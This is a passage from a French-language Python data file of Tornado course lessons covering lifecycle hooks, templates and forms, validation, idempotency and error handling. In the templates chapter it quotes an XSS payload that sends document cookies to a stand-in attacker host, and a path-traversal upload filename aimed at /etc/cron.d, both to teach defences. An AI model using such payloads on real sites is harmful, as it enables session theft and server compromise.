                    "Premièrement, on ne mesure jamais une latence HTTP avec l'horloge murale `time.time()` : lorsqu'un démon "
                    "de synchronisation horaire NTP recale l'heure système de quelques dizaines de millisecondes en arrière, "
                    "`time.time()` produit des durées négatives aberrantes ! L'horloge monotone matériellement garantie "
                    "**`time.perf_counter()`** croît strictement à la nanoseconde près sans jamais subir les sauts calendaires.\n\n"
                    "Deuxièmement, l'en-tête **`X-Request-ID`** (*Correlation ID*) relie l'expérience du client aux journaux "
                    "serveur : si la passerelle Nginx en amont a déjà forgé un `X-Request-ID`, `prepare(self)` le conserve "
                    "fidèlement (`self.request.headers.get('X-Request-ID')`) ; sinon, il en génère un via `uuid.uuid4()`, le "
                    "retourne au client dans les en-têtes HTTP et l'imprime dans `on_finish()`. En cas d'incident signalé par "
                    "un partenaire, une seule recherche sur cet identifiant reconstitue instantanément toute la chaîne d'appels."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE DE VIE COMPLET D'UNE REQUÊTE DANS UN BASEHANDLER TORNADO :\n\n"
            "  Requête HTTP Entrante -> Nouvelle instance du RequestHandler (self)\n"
            "          |\n"
            "          v\n"
            "  +------------------------------------------------------------------+\n"
            "  | 1. set_default_headers(self) & prepare(self)                     |\n"
            "  |    -> self.heure_debut = time.perf_counter()                     |\n"
            "  |    -> self.request_id  = \"req-a1b2c3d4\"                          |\n"
            "  |    -> self.set_header(\"X-Request-ID\", self.request_id)           |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v\n"
            "  +------------------------------------------------------------------+\n"
            "  | 2. Méthode Métier : def get(self) / def post(self)               |\n"
            "  |    -> Exécute le calcul / SQL et appelle self.write({...})       |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v  (Envoi de la réponse HTTP au client)\n"
            "  +------------------------------------------------------------------+\n"
            "  | 3. on_finish(self)                                               |\n"
            "  |    -> Calcule duree_ms = (perf_counter() - self.heure_debut)*1000|\n"
            "  |    -> Écrit la ligne [AUDIT] structurée dans les logs serveur    |\n"
            "  +------------------------------------------------------------------+"
        ),
        "reference_table": {
            "title": "Comparatif des Méthodes de Cycle de Vie d'un `RequestHandler` Tornado",
            "headers": ["Méthode Tornado", "Moment d'exécution", "Peut modifier les Headers HTTP ?", "Usage typique"],
            "rows": [
                ["`set_default_headers(self)`", "À l'instanciation du handler (et réinitialisation d'erreur)", "Oui (`self.set_header(...)`)", "En-têtes de sécurité (`nosniff`, `DENY`) et CORS"],
                ["`prepare(self)`", "Avant `get()` / `post()` (peut être `async def`)", "Oui (`self.set_header(...)`)", "Chronométrage, `X-Request-ID`, AuthN, Rate Limiting (`self.finish()` pour stopper)"],
                ["`on_finish(self)`", "Après l'envoi complet de la réponse au client", "**Non** (la réponse est déjà partie sur le réseau !)", "Journalisation d'audit (`[AUDIT]`), métriques Prometheus, nettoyage"],
                ["`write_error(self, status_code, **kwargs)`", "Lors d'un `send_error()` ou d'une exception non gérée", "Oui", "Formater toutes les erreurs HTTP (404, 405, 500) en JSON"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Appeler `self.set_header('X-Response-Time-Ms', ...)` à l'intérieur de `on_finish(self)`",
                "good": "Poser les en-têtes dans `set_default_headers()`, `prepare()` ou avant la fin de `get()`/`post()`",
                "why": "`on_finish(self)` s'exécute **après** que les octets HTTP ont été envoyés sur le socket réseau : modifier un en-tête dans `on_finish` n'a plus aucun effet sur la réponse reçue par le client."
            },
            {
                "bad": "Utiliser `time.time()` pour mesurer des durées d'exécution de quelques millisecondes",
                "good": "Utiliser l'horloge monotone haute précision `time.perf_counter()`",
                "why": "`time.perf_counter()` offre une résolution à la nanoseconde et n'est jamais faussé par les ajustements d'horloge NTP du système."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_2/04_middlewares_et_audit_log.py` dans l'atelier ci-dessus pour observer l'ordonnancement exact entre `prepare()`, la méthode HTTP et la trace `[AUDIT TORNADO]` émise par `on_finish()`.",
            "Vérifiez comment l'en-tête entrant `X-Request-ID: trace-client-personnalise-777` fourni par l'appelant est préservé de bout en bout par `prepare(self)` au lieu d'être écrasé."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.5 : MOTEUR TORNADO.TEMPLATE & FORMULAIRES WEB HTML (GET_BODY_ARGUMENT / REQUEST.FILES)
    # =========================================================================
    "d2-l5": {
        "context": (
            "En entreprise, une plateforme Tornado expose rarement uniquement des flux JSON machine-à-machine : elle "
            "dessert très fréquemment en parallèle un **portail d'exploitation back-office**, un écran d'authentification "
            "SSO ou des formulaires de téléversement documentaire destinés aux gestionnaires humains.\n\n"
            "Sur ce terrain hybride, deux confusions techniques causent d'innombrables failles et pannes : assembler du "
            "HTML par `f-strings` directement dans Python — ce qui ouvre instantanément la porte aux injections "
            "JavaScript (**XSS — Cross-Site Scripting**) — et tenter d'analyser la soumission d'un `<form method=\"POST\">` "
            "avec `json_decode(self.request.body)` alors que le navigateur expédie en réalité de "
            "l'`application/x-www-form-urlencoded` (lu par **`self.get_body_argument()`**) ou du `multipart/form-data` "
            "(lu par **`self.request.files`**)."
        ),
        "deep_sections": [
            {
                "heading": "1. Compilation en Bytecode Python par `tornado.template` et Auto-Échappement Anti-XSS",
                "body": (
                    "Contrairement aux moteurs de gabarits interprétés à chaque requête, **`tornado.template`** traduit chaque "
                    "fichier `.html` situé dans `template_path` en une véritable fonction Python compilée en mémoire lors du "
                    "premier appel à **`self.render(\"formations.html\", ...)`**, puis met ce bytecode en cache pour toutes "
                    "les requêtes suivantes. Sa grammaire se distingue par une grande concision : les expressions `{{ f[\"titre\"] }}` "
                    "évaluent directement du code Python, tandis que toutes les structures de contrôle (`{% for f in formations %}`, "
                    "`{% if erreurs %}`) se referment uniformément avec le mot-clé unique **`{% end %}`**.\n\n"
                    "#### Neutralisation automatique des injections XSS (*Cross-Site Scripting*)\n\n"
                    "Par défaut dans Tornado (`autoescape=\"xhtml_escape\"`), toute valeur injectée via `{{ ... }}` traverse "
                    "automatiquement `tornado.escape.xhtml_escape()` avant d'entrer dans le tampon HTML : si un attaquant "
                    "soumet le titre `<script>fetch('https://pirate.tld?c='+document.cookie)</script>`, Tornado émet les "
                    "entités inoffensives `&lt;script&gt;...&lt;/script&gt;` que le navigateur affiche comme un simple texte "
                    "inerte sans jamais exécuter le code malveillant."
                )
            },
            {
                "heading": "2. Anatomie sur le Fil d'un Formulaire HTML : `self.get_body_argument` face à `json_decode`",
                "body": (
                    "Lorsqu'un utilisateur clique sur le bouton d'envoi d'un `<form method=\"POST\" action=\"/formations\">`, "
                    "le navigateur collecte tous les champs munis d'un attribut **`name=\"...\"`** (et ignore totalement ceux "
                    "qui ne possèdent qu'un `id` CSS !), les encode en paires `cle=valeur` jointes par `&` et expédie la trame "
                    "sous l'en-tête **`Content-Type: application/x-www-form-urlencoded`**.\n\n"
                    "```http — Trame exacte émise par un navigateur lors d'un <form method=\"POST\">\n"
                    "POST /formations HTTP/1.1\r\n"
                    "Host: localhost:8888\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: 48\r\n"
                    "\r\n"
                    "titre=Architecture+API&duree_jours=5&salle=Labo1\n"
                    "```\n\n"
                    "Lorsque `tornado.httputil.parse_body_arguments()` détecte cet en-tête (ou `multipart/form-data`), il "
                    "alimente automatiquement `self.request.body_arguments`, que votre méthode `def post(self):` interroge "
                    "proprement via **`self.get_body_argument(\"titre\", \"\")`**. En revanche, si l'en-tête entrant commence "
                    "par `application/json`, `body_arguments` reste volontairement vide et c'est "
                    "**`tornado.escape.json_decode(self.request.body)`** qui prend le relais."
                )
            },
            {
                "heading": "3. Téléversement Binaire (`multipart/form-data` -> `self.request.files`) et Patron `PRG` (`303`)",
                "body": (
                    "L'ajout d'un champ `<input type=\"file\" name=\"document_pdf\">` oblige à déclarer "
                    "`enctype=\"multipart/form-data\"` sur la balise `<form>`. Le navigateur segmente alors le corps HTTP "
                    "autour d'une frontière unique (`boundary=----WebKitFormBoundary...`). Côté Tornado, chaque fichier reçu "
                    "est rangé dans **`self.request.files.get(\"document_pdf\", [])`** sous la forme d'une instance "
                    "`tornado.httputil.HTTPFile` (accessible comme un dictionnaire contenant `\"filename\"`, les octets bruts "
                    "`\"body\"` et `\"content_type\"`).\n\n"
                    "> [!WARNING] Assainissement obligatoire de `filename` contre le *Path Traversal*\n"
                    "> Le champ `filename` provient directement de la trame client et peut être forgé avec `curl` pour valoir "
                    "`\"../../../../etc/cron.d/backdoor\"` ! Extrayez toujours `os.path.basename(fichier[\"filename\"])`, "
                    "filtrez les caractères par expression régulière stricte (ou renommez le fichier avec un `uuid4().hex`), "
                    "vérifiez l'extension et contrôlez les premiers octets magiques (`b\"%PDF-\"` pour un PDF) avant d'écrire "
                    "sur disque.\n\n"
                    "Enfin, après le traitement réussi d'un formulaire HTML en `POST`, ne terminez pas par un simple "
                    "`self.render()` en code `200`, sinon un rafraîchissement clavier `F5` de l'opérateur soumettra une "
                    "seconde fois le formulaire en créant un doublon : appliquez le patron industriel **PRG (*Post / Redirect "
                    "/ Get*)** en appelant `self.redirect(\"/formations\", status=303)` (`303 See Other`)."
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON DES 3 FORMATS D'ENVOI POST ET LEUR LECTURE DANS TORNADO\n"
            "===================================================================\n\n"
            "  [1] FORMULAIRE HTML CLASSIQUE (<form method=\"POST\">)\n"
            "      Header  : Content-Type: application/x-www-form-urlencoded\n"
            "      Body    : titre=API+Tornado&duree_jours=5&salle=Salle+A\n"
            "      Tornado : self.get_body_argument(\"titre\")  |  Réponse : self.render(\"...\") ou self.redirect()\n\n"
            "  [2] FORMULAIRE HTML AVEC FICHIER (<form method=\"POST\" enctype=\"multipart/form-data\">)\n"
            "      Header  : Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...\n"
            "      Tornado : Texte -> self.get_body_argument(\"...\")  +  Fichier -> self.request.files[\"document_pdf\"][0]\n\n"
            "  [3] CLIENT API / FETCH JAVASCRIPT / MOBILE\n"
            "      Header  : Content-Type: application/json\n"
            "      Body    : {\"titre\": \"API Tornado\", \"duree_jours\": 5, \"salle\": \"Salle A\"}\n"
            "      Tornado : tornado.escape.json_decode(self.request.body)  |  Réponse : self.set_status(201); self.write({...})"
        ),
        "reference_table": {
            "title": "Tableau Comparatif : Formulaires Web HTML (`get_body_argument` / `self.render`) vs API JSON (`json_decode`)",
            "headers": ["Caractéristique", "Formulaire HTML Classique", "Formulaire avec Fichier (Upload)", "Requête API REST (JSON)"],
            "rows": [
                ["En-tête `Content-Type`", "`application/x-www-form-urlencoded`", "`multipart/form-data`", "`application/json`"],
                ["Méthode de lecture Tornado", "`self.get_body_argument('champ', '')`", "`self.get_body_argument` + `self.request.files['fichier']`", "`tornado.escape.json_decode(self.request.body)`"],
                ["Attribut HTML obligatoire", "`<input name=\"champ\">` (`name` et non `id`)", "`<form enctype=\"multipart/form-data\">`", "Clé de l'objet JSON `{\"champ\": ...}`"],
                ["Méthode de réponse Tornado", "`self.render('page.html', ...)` ou `self.redirect()`", "`self.render()` ou `self.write()`", "`self.set_status(201); self.write({...})`"],
                ["Commande `curl` équivalente", "`curl -X POST -d \"titre=Tornado&jours=5\" URL`", "`curl -X POST -F \"doc=@cours.pdf\" URL`", "`curl -X POST -H \"Content-Type: application/json\" -d '{...}' URL`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire du HTML en dur dans Python (`self.write(f'<h1>Bonjour {nom}</h1>')`) au lieu d'utiliser `self.render()`",
                "good": "Placer tout le HTML dans `templates/fichier.html` et utiliser `self.render('fichier.html', nom=nom)`",
                "why": "La concaténation HTML dans Python rend le code ingérable et expose l'application aux injections JavaScript (XSS), alors que `tornado.template` échappe automatiquement `{{ nom }}`."
            },
            {
                "bad": "Fermer une boucle avec `{% endfor %}` ou `{% endif %}` dans un template Tornado natif",
                "good": "Toujours fermer les blocs `{% for %}` et `{% if %}` avec `{% end %}` dans `tornado.template`",
                "why": "Le moteur `tornado.template` utilise le mot-clé universel `{% end %}` (`ParseError: unknown operator: 'endfor'`)."
            },
            {
                "bad": "Appeler `tornado.escape.json_decode(self.request.body)` pour lire un `<form method=\"POST\">` HTML standard",
                "good": "Utiliser `self.get_body_argument(...)` pour un formulaire HTML",
                "why": "Un formulaire HTML envoie `application/x-www-form-urlencoded`, donc `json_decode` lèverait `JSONDecodeError`."
            }
        ],
        "practical_exercises": [
            "Ouvrez l'atelier interactif réel sur `/sandbox/formulaire-jinja`, soumettez une nouvelle formation via le formulaire HTML et observez le décodage `application/x-www-form-urlencoded` opéré côté serveur.",
            "Soumettez volontairement une durée négative et un intitulé d'un seul caractère afin de vérifier comment la boucle `{% for err in erreurs %} ... {% end %}` restitue les anomalies sans planter."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.1 : CRUD MÉMOIRE, VALIDATION & RFC 7807 (400 vs 422)
    # =========================================================================
    "d3-l1": {
        "context": (
            "Tant qu'un serveur se contente d'exposer des routes de lecture `GET`, son état interne demeure préservé. "
            "Mais dès que vous ouvrez les opérations complètes du cycle **CRUD** — créer (`POST`), remplacer (`PUT`), "
            "modifier partiellement (`PATCH`) et supprimer (`DELETE`) — l'axiome fondamental de la sécurité applicative "
            "s'applique sans compromis : **ne jamais accorder la moindre confiance aux octets reçus du réseau "
            "(*Never Trust User Input*)**.\n\n"
            "Contrairement à FastAPI qui délègue ce filtrage à Pydantic par annotations de signature, Tornado laisse à "
            "l'architecte la responsabilité explicite de décoder `self.request.body` et de qualifier chaque violation. "
            "Ce chapitre enseigne comment bâtir un pipeline de validation déterministe distinguant **`400 Bad Request`** "
            "de **`422 Unprocessable Content`** et formatant chaque diagnostic selon la norme **IETF RFC 7807 / RFC 9457 "
            "(*Problem Details for HTTP APIs*)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Désérialisation Blindée de `self.request.body` dans un `RequestHandler` Tornado",
                "body": (
                    "Dans un `RequestHandler`, le tampon brut `self.request.body` est toujours un objet `bytes` (éventuellement "
                    "vide `b\"\"` si le client n'a transmis aucun corps). Invoquer directement `tornado.escape.json_decode(self.request.body)` "
                    "sans protection expose la route à trois familles d'exceptions : `json.JSONDecodeError` (sous-classe de "
                    "`ValueError`) si le JSON comporte une virgule pendante ou est vide, `UnicodeDecodeError` si le flux "
                    "contient des octets non UTF-8 invalides, et enfin le cas subtil où le client envoie un littéral JSON "
                    "valide mais non objet tel que `\"bonjour\"`, `42` ou `[1, 2, 3]` — ce qui provoquerait une `AttributeError` "
                    "dès le premier appel ultérieur à `corps.get(\"titre\")` !\n\n"
                    "```python — Helper défensif d'extraction d'objet JSON dans BaseJSONHandler\n"
                    "def lire_objet_json(self) -> dict | None:\n"
                    "    if not self.request.body:\n"
                    "        return None\n"
                    "    try:\n"
                    "        donnees = tornado.escape.json_decode(self.request.body)\n"
                    "    except (ValueError, UnicodeDecodeError):\n"
                    "        return None\n"
                    "    return donnees if isinstance(donnees, dict) else None\n"
                    "```\n\n"
                    "Lorsque `lire_objet_json()` retourne `None`, le contrôleur coupe immédiatement l'exécution avec "
                    "`self.set_status(400)` (**`400 Bad Request`**) car la syntaxe même du conteneur JSON est inexploitable."
                )
            },
            {
                "heading": "2. Collecte Exhaustive des Erreurs Métier vs Arrêt au Premier Champ (`Fail-Fast` vs `Collect-All`)",
                "body": (
                    "Considérez un écran d'inscription mobile comportant huit champs de saisie dont trois violent vos règles "
                    "métier. Si votre validateur Python s'interrompt dès la première anomalie rencontrée, l'utilisateur est "
                    "contraint de soumettre trois fois le formulaire en corrigeant une erreur après l'autre — une friction "
                    "ergonomique rédhibitoire autant pour un humain que pour un intégrateur B2B.\n\n"
                    "Une fonction pure `valider_payload_formation(corps: dict) -> dict[str, str]` inspecte donc séquentiellement "
                    "**tous les attributs** du dictionnaire et accumule chaque violation dans un conteneur `erreurs` indexé "
                    "par nom de champ. Ce n'est qu'à l'issue de l'inspection complète que le `RequestHandler` teste `if erreurs:`, "
                    "positionne **`self.set_status(422)`** et restitue en un unique aller-retour la cartographie complète des "
                    "champs à rectifier."
                )
            },
            {
                "heading": "3. La Norme Internationale IETF RFC 7807 / RFC 9457 (`application/problem+json`)",
                "body": (
                    "Pendant longtemps, chaque équipe backend inventait son propre dialecte d'erreur incompatible (`{\"err\": ...}`, "
                    "`{\"error_msg\": ...}`, `{\"fault\": {\"code\": ...}}`), obligeant les clients à écrire un parseur "
                    "d'erreur sur mesure par fournisseur. Pour unifier l'écosystème Web mondial, l'IETF a publié la **RFC 7807** "
                    "(consolidée en 2023 par la **RFC 9457**), qui standardise l'en-tête **`Content-Type: application/problem+json`**.\n\n"
                    "> « Ce document définit un format de détail de problème permettant d'embarquer des informations lisibles "
                    "par machine dans une réponse d'erreur HTTP, évitant ainsi d'inventer de nouveaux formats de réponse "
                    "d'erreur pour les APIs HTTP. » — Mark Nottingham & Erik Wilde, IETF RFC 7807 (Abstract)\n\n"
                    "```json — Enveloppe normalisée RFC 7807 émise avec self.set_status(422)\n"
                    "{\n"
                    "  \"type\": \"https://api.isgp.dz/erreurs/validation-metier\",\n"
                    "  \"title\": \"Échec de validation des règles métier\",\n"
                    "  \"status\": 422,\n"
                    "  \"detail\": \"Deux attributs du payload violent les contraintes du catalogue.\",\n"
                    "  \"instance\": \"/api/v1/formations\",\n"
                    "  \"errors\": {\n"
                    "    \"titre\": \"Le titre doit comporter au moins 3 caractères.\",\n"
                    "    \"duree_jours\": \"La durée doit être comprise entre 1 et 30 jours.\"\n"
                    "  }\n"
                    "}\n"
                    "```\n\n"
                    "En cas de validation intégralement réussie sur `POST`, le contrôleur insère la ressource, invoque "
                    "**`self.set_status(201)`**, renseigne l'en-tête normatif **`self.set_header(\"Location\", f\"/api/v1/formations/{new_id}\")`** "
                    "indiquant l'URI canonique de l'entité fraîchement créée, puis sérialise sa représentation complète."
                )
            }
        ],
        "architecture_diagram": (
            "ENTONNOIR DE VALIDATION DÉFENSIVE D'UNE REQUÊTE POST / PUT DANS TORNADO :\n\n"
            "  Requête POST entrante (self.request.body)\n"
            "        |\n"
            "        +---> 1. Le Body est-il un objet JSON syntaxiquement valide (tornado.escape.json_decode) ?\n"
            "        |        NON ---> self.set_status(400) : HTTP 400 Bad Request (Syntaxe illisible)\n"
            "        |\n"
            "        +---> 2. Les champs respectent-ils les types et bornes métier (len >= 3, 1 <= duree <= 30) ?\n"
            "        |        NON ---> self.set_status(422) : HTTP 422 Unprocessable Entity (Format RFC 7807 + liste 'errors')\n"
            "        |\n"
            "        v     3. OUI ---> Insertion en base + self.set_status(201) + self.set_header('Location', ...)"
        ),
        "reference_table": {
            "title": "Distinction Précise des Codes HTTP lors de la Création / Validation (`POST`)",
            "headers": ["Code HTTP", "Situation précise", "Exemple d'entrée client", "Action attendue côté client"],
            "rows": [
                ["**`201 Created`**", "Création réussie de la ressource", "`{\"titre\": \"Architecture API\", \"duree_jours\": 5}`", "Lire la nouvelle ressource créée (et son nouvel `id`)"],
                ["**`400 Bad Request`**", "JSON cassé ou illisible", "`{\"titre\": \"API\",` (accolade fermante oubliée)", "Corriger la syntaxe JSON du programme client"],
                ["**`415 Unsupported Media Type`**", "En-tête `Content-Type` manquant ou erroné", "Envoi en `text/plain` au lieu de `application/json`", "Ajouter `-H \"Content-Type: application/json\"`"],
                ["**`422 Unprocessable Entity`**", "JSON valide mais règles métier violées", "`{\"titre\": \"AB\", \"duree_jours\": -5}`", "Afficher les messages de `errors` sur les champs du formulaire"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Supposer que parce que le Frontend JavaScript valide le formulaire, le Backend Tornado n'a pas besoin de valider",
                "good": "Toujours appliquer 100 % des validations de types et de bornes dans le Backend Python",
                "why": "Un attaquant utilise `curl` ou un script Python pour appeler directement votre API en contournant totalement l'interface Web !"
            },
            {
                "bad": "Laisser `200 OK` sur un `POST` qui crée un nouvel enregistrement",
                "good": "Appeler `self.set_status(201)` accompagné de `self.set_header('Location', f'/api/formations/{new_id}')`",
                "why": "`201 Created` indique explicitement qu'un nouvel état a été persisté avec succès."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_3/01_api_crud_memoire.py` dans l'atelier ci-dessus pour observer la structure exacte du document `application/problem+json` (RFC 7807) généré lorsqu'un titre trop court et une durée négative sont soumis simultanément.",
            "Actionnez le bouton « Tester la création : POST /api/sandbox/formations » afin de persister une nouvelle entrée et d'inspecter le code `201 Created` retourné."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.2 : PUT VS PATCH & IDEMPOTENCE POST (IDEMPOTENCY-KEY)
    # =========================================================================
    "d3-l2": {
        "context": (
            "Dans la conception d'APIs critiques — paiement électronique, réservation de places ou gestion administrative — "
            "deux décisions d'architecture séparent immédiatement une implémentation rigoureuse d'un système fragile : "
            "maîtriser la frontière sémantique exacte entre **`def put(self, id)`** et **`def patch(self, id)`**, et "
            "garantir qu'un client dont la connexion mobile s'interrompt en plein milieu d'un **`POST`** puisse rejouer "
            "sa requête sans jamais provoquer de double facturation.\n\n"
            "Ce chapitre formalise les contrats RFC 9110 et RFC 5789 au sein d'un `RequestHandler` Tornado et implémente "
            "le mécanisme industriel de déduplication par en-tête **`Idempotency-Key`** popularisé par Stripe et Adyen."
        ),
        "deep_sections": [
            {
                "heading": "1. Remplacement Intégral (`def put` — RFC 9110) face à Mutation Partielle (`def patch` — RFC 5789)",
                "body": (
                    "Considérons l'enregistrement `#1` stocké sur le serveur : "
                    "`{\"id\": 1, \"titre\": \"Tornado Async\", \"duree_jours\": 5, \"salle\": \"Labo 1\"}`. Dans la classe "
                    "`FormationItemHandler`, les méthodes `put` et `patch` opèrent sur la même URI `/api/v1/formations/1`, "
                    "mais obéissent à deux contrats opposés. La sémantique normative de **`PUT`** exige le **remplacement "
                    "complet** de l'état de la ressource cible par la représentation fournie : le client doit transmettre "
                    "l'intégralité des champs obligatoires (`titre`, `duree_jours`, `salle`), et tout attribut optionnel "
                    "absent du payload est réinitialisé.\n\n"
                    "À l'inverse, introduite par l'**IETF RFC 5789**, la méthode **`PATCH`** transporte un **ensemble "
                    "partiel d'instructions de modification** (*JSON Merge Patch* RFC 7396) : si le gestionnaire souhaite "
                    "uniquement transférer la session vers `\"Salle Conférence\"` sans connaître ni réécrire sa durée, il "
                    "envoie le seul dictionnaire `{\"salle\": \"Salle Conférence\"}`. Votre méthode `def patch(self, id_str):` "
                    "ne met à jour que les clés explicitement présentes dans `corps` tout en conservant `titre` et "
                    "`duree_jours` strictement intacts."
                )
            },
            {
                "heading": "2. Le Scénario des « Deux Généraux » : Pourquoi `POST` Crée des Doublons sur Réseau Instable",
                "body": (
                    "En informatique distribuée, l'impossibilité de distinguer à coup sûr une requête perdue à l'aller d'une "
                    "réponse perdue au retour est connue sous le nom de *problème des deux généraux*. Suivons chronologiquement "
                    "ce qui se passe lorsqu'un téléphone mobile envoie `POST /api/v1/paiements` (`{\"montant\": 25000}`) dans "
                    "un ascenseur ou un tunnel routier : le paquet TCP parvient bien au démon Tornado, la transaction SQL "
                    "débite les 25 000 DZD avec `conn.commit()`, et Tornado pousse `HTTP/1.1 201 Created` dans son tampon "
                    "d'écriture. Mais à cet instant précis, la couverture 4G s'évanouit pendant quatre secondes.\n\n"
                    "N'ayant jamais reçu l'octet de confirmation `201`, le SDK mobile lève une `TimeoutError`. S'il réémet "
                    "automatiquement le même `POST /api/v1/paiements` dès le retour du réseau sans mécanisme d'idempotence, "
                    "Tornado traite cette trame comme une intention neuve et débite une **seconde fois** les 25 000 DZD !"
                )
            },
            {
                "heading": "3. Implémentation d'un Cache Atomique `Idempotency-Key` dans Tornado",
                "body": (
                    "Pour conférer artificiellement l'idempotence à une opération `POST` critique, l'industrie applique le "
                    "protocole **`Idempotency-Key`** (spécification IETF *Idempotency-Key HTTP Header Field*). **Avant sa "
                    "toute première tentative**, c'est impérativement le **client** qui génère un identifiant aléatoire "
                    "universellement unique (`UUID v4`, ex. `Idempotency-Key: idem-8f9c2a10-4b1e`) attaché à l'action "
                    "métier, et il conserve cette même clé pour tous ses réessais éventuels.\n\n"
                    "```python — Déduplication par Idempotency-Key avec empreinte du payload (SHA-256)\n"
                    "cle_idem = self.request.headers.get(\"Idempotency-Key\", \"\").strip()\n"
                    "empreinte_corps = hashlib.sha256(self.request.body).hexdigest()\n"
                    "if cle_idem and cle_idem in CACHE_IDEMPOTENCE:\n"
                    "    entree = CACHE_IDEMPOTENCE[cle_idem]\n"
                    "    if entree[\"hash\"] != empreinte_corps:\n"
                    "        self.set_status(422)  # Même clé réutilisée avec un montant différent !\n"
                    "        self.finish({\"erreur\": \"Conflit de payload sur cette Idempotency-Key\"})\n"
                    "        return\n"
                    "    self.set_header(\"X-Idempotent-Replay\", \"true\")\n"
                    "    self.set_status(entree[\"status\"])\n"
                    "    self.finish(entree[\"body\"])\n"
                    "    return\n"
                    "```\n\n"
                    "> [!TIP] Déploiement multi-processus derrière Nginx\n"
                    "> En production sur un cluster de 4 instances Tornado (`:8001..8004`), un réessai client peut atterrir "
                    "sur le nœud `:8003` alors que l'essai initial avait frappé `:8001`. Le registre `CACHE_IDEMPOTENCE` "
                    "doit donc résider dans un magasin partagé atomique tel que **Redis** (`SET key val NX EX 86400`) ou une "
                    "contrainte `UNIQUE` en base SQL."
                )
            }
        ],
        "architecture_diagram": (
            "PROTECTION ANTI-DOUBLON PAR EN-TÊTE 'Idempotency-Key' SUR UN POST :\n\n"
            "  Appel #1 : POST /api/paiements (Header -> Idempotency-Key: uuid-123)\n"
            "     |---> Clé 'uuid-123' inconnue en cache\n"
            "     |---> Exécute la transaction #1 en base SQL\n"
            "     |---> Sauvegarde CACHE['uuid-123'] = Réponse #1\n"
            "     +---> (Coupure réseau 4G avant réception par le téléphone !)\n\n"
            "  Appel #2 (Réessai automatique) : POST /api/paiements (Header -> Idempotency-Key: uuid-123)\n"
            "     |---> Clé 'uuid-123' TROUVÉE dans CACHE !\n"
            "     |---> [AUCUNE écriture en base SQL — Doublon évité !]\n"
            "     +---> Renvoie immédiatement CACHE['uuid-123'] (avec X-Idempotent-Replay: true)"
        ),
        "reference_table": {
            "title": "Comparatif Technique : `POST` vs `PUT` vs `PATCH` dans Tornado",
            "headers": ["Critère", "`POST /api/formations` (`def post`)", "`PUT /api/formations/1` (`def put`)", "`PATCH /api/formations/1` (`def patch`)"],
            "rows": [
                ["**Cible URL**", "Collection (`/formations`)", "Ressource précise (`/formations/1`)", "Ressource précise (`/formations/1`)"],
                ["**Rôle sémantique**", "Créer une nouvelle ressource", "Remplacer intégralement la ressource `#1`", "Modifier partiellement certains champs de `#1`"],
                ["**Champs requis dans le JSON**", "Tous les champs obligatoires", "Tous les champs de la ressource", "Uniquement le(s) champ(s) à modifier"],
                ["**Idempotent par nature ?**", "Non (nécessite `Idempotency-Key`)", "**Oui**", "Oui (si mise à jour par valeur fixe)"],
                ["**Code HTTP de succès**", "`201 Created`", "`200 OK`", "`200 OK`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écraser les champs non fournis par `None` lors d'une requête `PATCH`",
                "good": "Dans `def patch(self, id):`, ne mettre à jour une clé que `if cle in corps:`",
                "why": "Le principe même de `PATCH` est de laisser intacts tous les champs qui ne figurent pas dans le JSON envoyé."
            },
            {
                "bad": "Générer l'`Idempotency-Key` côté serveur au lieu de la faire générer par le client",
                "good": "C'est toujours le **Client** qui génère l'UUID de l'`Idempotency-Key` avant son 1er essai et le réutilise en cas de réessai",
                "why": "Si le serveur générait la clé à chaque requête entrante, il ne pourrait jamais savoir que deux appels successifs correspondent à la même intention du client."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_3/03_put_patch_et_idempotence.py` dans l'atelier ci-dessus pour constater que deux requêtes `POST` successives munies de la même `Idempotency-Key` ne génèrent qu'une unique entité en mémoire.",
            "Rendez-vous dans l'onglet **curl & Postman** et exécutez la commande `2.4 — PATCH` pour modifier uniquement l'attribut `salle` de la formation `#1`."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.3 : GESTIONNAIRES D'ERREURS GLOBAUX (WRITE_ERROR & DEFAULT_HANDLER_CLASS)
    # =========================================================================
    "d3-l3": {
        "context": (
            "Que renvoie par défaut un serveur Tornado fraîchement installé lorsqu'un client interroge une URL "
            "inconnue (`/api/v1/introuvable`), invoque un verbe non implémenté (`DELETE /api/v1/catalogue`) ou "
            "déclenche une division par zéro imprévue au milieu d'un calcul ? Il émet une **page Web HTML** "
            "`<html><title>404: Not Found</title><body>404: Not Found</body></html>` !\n\n"
            "Pour une application mobile ou un microservice partenaire qui exécute systématiquement `await response.json()`, "
            "recevoir le chevron ouvrant `<` de `<html>` provoque un crash côté client (`SyntaxError: Unexpected token '<'`), "
            "masquant le véritable code HTTP d'origine. Ce chapitre montre comment verrouiller un **contrat 100 % JSON "
            "en toutes circonstances** grâce au tandem **`write_error()`** et **`default_handler_class`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Le Pipeline d'Exception de Tornado : `send_error()` et `write_error(status_code, **kwargs)`",
                "body": (
                    "Dans le code source interne de `tornado.web.RequestHandler`, toute anomalie levée pendant `prepare()` ou "
                    "pendant la méthode HTTP (`get`, `post`, `put`, `delete`) est capturée par `_handle_request_exception(e)`. "
                    "Si l'exception est une instance de `tornado.web.HTTPError(status_code, reason=...)`, Tornado extrait son "
                    "code HTTP ; s'il s'agit d'une exception Python quelconque non gérée (`ZeroDivisionError`, `KeyError`, "
                    "`RuntimeError`), il la journalise sur `tornado.application` et fixe le code à `500`. Dans les deux cas, "
                    "Tornado appelle `self.send_error(status_code, exc_info=sys.exc_info())`, qui **vide d'abord tout tampon "
                    "partiel via `self.clear()`**, positionne le statut, puis délègue le formatage final du corps à "
